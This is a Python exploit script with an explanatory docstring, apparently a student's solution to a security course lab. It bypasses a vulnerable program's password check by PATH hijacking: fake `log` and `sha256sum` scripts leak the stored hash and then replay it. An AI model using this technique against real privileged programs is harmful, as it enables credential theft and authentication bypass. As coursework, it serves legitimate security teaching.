
# Benny Liang | UCID: 30192142 | Assignment 3

"""
TASK 5 solution explanation
========================================================================

### how I found the vulnerability
* I analyzed the vulnerable program's source code `task5-vuln.c` and found that I can retrieve
    sensative information about the `stored_pass_hash`.
* I also found that I can trick the vulnerable program to retrieve any hash I give it in the
    hashString() function.
* Knowing the two, I can retrieve the `stored_pass_hash` and then give the program the same hash
    to obtain the hidden message.

### how the script works
* I first made a fake `log` as a file with a command that will print out the `stored_pass_hash` when the vulnerable program calls it
* I then set the environment `PATH` variable so the fake versions will be used
* I used `pexpect.popen_spawn.PopenSpawn` to start and to interact with the vulnerable program
* I started the vulnerable executable with a wrapper function `color_spawn()`, which calls `pexpect.popen_spawn.PopenSpawn`,
    where I then retrieve the `log` output (the `stored_pass_hash` value), and finish executing the program. Removing the `log` file afterwards
* I create a fake `sha256sum` as a file with a command that will print out the `stored_pass_hash`.
* I start up the vulnerable program once again, when it calls hashString() it will interact with  the fake `sha256sum` and it will 
    output the same hash stored in the vulnerable program. Passing the password check (it thinks I gave it the correct password).
    I input an arbitrary password and retrieve the hidden message.
"""

import os
import sys
from pexpect import popen_spawn
import pexpect

# debugging output controlled via DEBUG environment variable
DEBUG = os.environ.get("DEBUG", "0") in ["1", "color"]
DEBUG_COLOR = os.environ.get("DEBUG", "0").lower() == "color"
ARBITRARY_PASSWORD = "STRING"

class ColoredLog:
    """A pexpect logfile that adds color to output."""

    def __init__(self, color="1;34"):
        self.prefix = f"\033[{color}m".encode("ascii") if DEBUG_COLOR else b""
        self.suffix = b"\033[0m" if DEBUG_COLOR else b""

    def write(self, s: bytes):
        """write() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.write(self.prefix)
            # convert s to string but escape non-printable characters with backslash escapes
            ss = ""
            for c in s:
                if chr(c) in "\\":  # escape backslash and brackets
                    ss += "\\" + chr(c)
                elif (c >= 32 and c <= 126) or (chr(c) in "\n\t"):
                    ss += chr(c)
                else:
                    ss += f"\\{c:02x}"
            sys.stdout.buffer.write(ss.encode("ascii"))
            sys.stdout.buffer.write(self.suffix)

    def flush(self):
        """flush() method for pexpect logfile interface"""
        if DEBUG:
            sys.stdout.buffer.flush()


def color_spawn(*args, **kwargs):
    """wrapper for pexpect.popen_spawn.PopenSpawn() and attaching a logger"""
    p = popen_spawn.PopenSpawn(*args, **kwargs)
    p.logfile_read = ColoredLog("1;34")
    p.logfile_send = ColoredLog("1;32")
    return p


def main(execname):
    """exploit the vulnerable executable using pexpect"""

    try:
        # create a fake `log` that will print out the `stored_pass_hash` that the vulnerable executable will write to
        cwd = os.getcwd()
        log_path = os.path.join(cwd, "log")
        
        with open(log_path, "w") as file:
            file.write('''
                       printf '%s' "$2"
                       ''')   # will print out the `stored_pass_hash` (arg 2)
                # when the vulnerable program calls `log` it will send 2 arguments;
                    # 1st: `-stored-hash`
                    # 2nd: `stored_pass_hash` value

            # set file permissions to `rwx` for user, group, and others
            os.chmod(log_path, 0o777)     
        
        # launch the program with our PATH first so our ./log is used
        env = os.environ.copy()
        env["PATH"] = cwd + os.pathsep + env.get("PATH", "")
        
        # debug
        # print(f"---log path: \n{log_path}\n---")   
        # with open(log_path, "r") as f:
        #     print(f"---log file contents: \n{f.read()}\n---")
        # print(f"---PATH: \n{env["PATH"]}\n---")
        
        # start the vulnerable program
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f'stdbuf -o0 {execname}', timeout=10, env=env)

        # wait for the password prompt
        process.expect_exact("Password:")
        stored_pass_hash = process.before.decode("ascii").rstrip()  # get the `stored_pass_hash` from the `log` output
        
        # finish executing the vulnerable program
        process.sendline(ARBITRARY_PASSWORD)                        # send arbitrary password
        process.expect(pexpect.EOF, timeout=10)
        
        # debug
        # msg = process.before.decode("ascii").rstrip()
        # print(f"msg = `{msg}`")
        # print(f"---stored_pass_hash: \n{stored_pass_hash}\n---")
        
        # remove the `log` file
        os.remove(log_path)   
        
        # create a fake `sha256sum` that will output the `stored_pass_hash` found when the 
        # vulnerable program opens it while inside the `hashString()` function
        fake_sha_sum_path = os.path.join(cwd, "sha256sum")
        with open(fake_sha_sum_path, "w") as file:
            file.write(f'''
                       printf '%s' "{stored_pass_hash}"
                       ''')     # will print out the discovered `stored_pass_hash`
            
            # set file permissions to `rwx` for user, group, and others
            os.chmod(fake_sha_sum_path, 0o777)
        
        # debug
        # print(f"---fake_sha_sum_path: \n{fake_sha_sum_path}\n---")   
        # with open(fake_sha_sum_path, "r") as f:
        #     print(f"---fake_sha_sum_path contents: \n{f.read()}\n---")
        
        # start the vulnerable program again
        # since popen() is not using pty, we need to use stdbuf(1)
        # to disable output buffering
        process = color_spawn(f'stdbuf -o0 {execname}', timeout=10, env=env)
        
        # wait for the password prompt
        process.expect_exact("Password:")
        process.sendline(ARBITRARY_PASSWORD)                        # send arbitrary password        
        
        # recover the hidden message
        # notice that with popen_spawn we can use \n line endings
        process.expect_exact("-----BEGIN HIDDEN MESSAGE-----\n")
        process.expect_exact("-----END HIDDEN MESSAGE-----")
        hidden_message = process.before.decode("ascii").rstrip()
        # optional: read the remaining output of the program one line at a time until <EOF>
        process.expect(pexpect.EOF, timeout=10)

        # print out the recovered hidden message
        print("Recovered hidden message:", hidden_message)
        
        # remove the fake sha256sum
        os.remove(fake_sha_sum_path)
        
        process.kill(True)

    except Exception:  # pylint: disable=broad-except
        print("Exploit failed.")
        if DEBUG:
            raise


if __name__ == "__main__":
    main(sys.argv[1])
